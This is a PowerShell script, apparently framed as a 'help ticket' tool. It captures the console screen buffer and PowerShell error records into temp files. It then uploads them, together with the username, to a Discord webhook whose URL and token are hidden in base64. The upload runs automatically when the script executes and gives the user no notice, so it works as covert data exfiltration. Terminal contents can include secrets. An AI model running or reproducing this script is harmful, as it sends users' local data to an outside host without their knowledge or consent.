
function Upload-Discord {

	[CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$False)]
		[string]$file,
		[parameter(Position=1,Mandatory=$False)]
		[string]$text 
	)

	$hookurl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjA0MjI2NzIzOTM5NTM5OC9EN2JDMkFuRFVfajYybU1EOEVGUENsSmtrMTdPV0w4ZnNqMW5JdkRHckJOWjJfTUZuQlZkQ2ZLRjRkS1Zac2tTU0dMUg=="))

	$Body = @{
	  'username' = $env:username
	  'content' = $text
	}

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

	if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}


# ----------------------------------------------------------------------------------------------------------------------

function Resolve-ErrorRecord
{
    param(
        [Parameter(Position=0, ValueFromPipeline=$true)]
        [ValidateNotNull()]
        [System.Management.Automation.ErrorRecord[]]
        $ErrorRecord
    )

    Process
    {
        if (!$ErrorRecord)
        {
            if ($global:Error.Count -eq 0)
            {
                Write-Host "The `$Error collection is empty."
                return
            }
            else
            {
                $ErrorRecord = @($global:Error[0])
            }
        }
        foreach ($record in $ErrorRecord)
        {
            $txt =  @($record | Format-List * -Force | Out-String -Stream)
            $txt += @($record.InvocationInfo | Format-List * | Out-String -Stream)
            $Exception = $record.Exception
            for ($i = 0; $Exception; $i++, ($Exception = $Exception.InnerException))
            {
               $txt += "Exception at nesting level $i ---------------------------------------------------"
               $txt += @($Exception | Format-List * -Force | Out-String -Stream)
            }

            $txt | Foreach {$prevBlank=$false} {
                       if ($_.Trim().Length -gt 0)
                       {
                           $_
                           $prevBlank = $false
                       }
                       elseif (!$prevBlank)
                       {
                           $_
                           $prevBlank = $true
                       }
                   }
        }
    }
}

# ----------------------------------------------------------------------------------------------------------------------

function Get-ScreenCss
{
    param()

    Process
    {
        '<style>'
        [Enum]::GetValues([ConsoleColor]) | Foreach {
            "  .F$_ { color: $_; }"
            "  .B$_ { background-color: $_; }"
        }
        '</style>'
    }
}

# ----------------------------------------------------------------------------------------------------------------------


function Get-ScreenHtml
{
    param($Count = $Host.UI.RawUI.WindowSize.Height)

    Begin
    {
        # Required by HttpUtility
        Add-Type -Assembly System.Web

        $raw = $Host.UI.RawUI
        $buffsz = $raw.BufferSize

        function BuildHtml($out, $buff)
        {
            function OpenElement($out, $fore, $back)
            {
                & {
                    $out.Append('<span class="F').Append($fore)
                    $out.Append(' B').Append($back).Append('">')
                } | out-null
            }

            function CloseElement($out) {
                $out.Append('</span>') | out-null
            }

            $height = $buff.GetUpperBound(0)
            $width  = $buff.GetUpperBound(1)

            $prev = $null
            $whitespaceCount = 0

            $out.Append("<pre class=`"B$($Host.UI.RawUI.BackgroundColor)`">") | out-null

            for ($y = 0; $y -lt $height; $y++)
            {
                for ($x = 0; $x -lt $width; $x++)
                {
                    $current = $buff[$y, $x]

                    if ($current.Character -eq ' ')
                    {
                        $whitespaceCount++
                        write-debug "whitespaceCount: $whitespaceCount"
                    }
                    else
                    {
                        if ($whitespaceCount)
                        {
                            write-debug "appended $whitespaceCount spaces, whitespaceCount: 0"
                            $out.Append((new-object string ' ', $whitespaceCount)) | out-null
                            $whitespaceCount = 0
                        }

                        if ((-not $prev) -or
                            ($prev.ForegroundColor -ne $current.ForegroundColor) -or
                            ($prev.BackgroundColor -ne $current.BackgroundColor))
                        {
                            if ($prev) { CloseElement $out }

                            OpenElement $out $current.ForegroundColor $current.BackgroundColor
                        }

                        $char = [System.Web.HttpUtility]::HtmlEncode($current.Character)
                        $out.Append($char) | out-null
                        $prev =    $current
                    }
                }

                $out.Append("`n") | out-null
                $whitespaceCount = 0
            }

            if($prev) { CloseElement $out }

            $out.Append('</pre>') | out-null
        }
    }

    Process
    {
        $cursor = $raw.CursorPosition

        $rect = new-object Management.Automation.Host.Rectangle 0, ($cursor.Y - $Count), $buffsz.Width, $cursor.Y
        $buff = $raw.GetBufferContents($rect)

        $out = new-object Text.StringBuilder
        BuildHtml $out $buff
        $out.ToString()
    }
}

# ----------------------------------------------------------------------------------------------------------------------
function main {
$css  = Get-ScreenCss
$html = Get-ScreenHtml

echo $css  > $env:tmp\jakobyHelpTicket.html
echo $html >> $env:tmp\jakobyhelpticket.html

$errorRecord = Resolve-ErrorRecord
echo $errorRecord > $env:tmp\ErrorRecord.txt

Upload-Discord -file $env:tmp\jakobyHelpTicket.html

Upload-Discord -file $env:tmp\ErrorRecord.txt

}

main
# ----------------------------------------------------------------------------------------------------------------------
# ----------------------------------------------------------------------------------------------------------------------
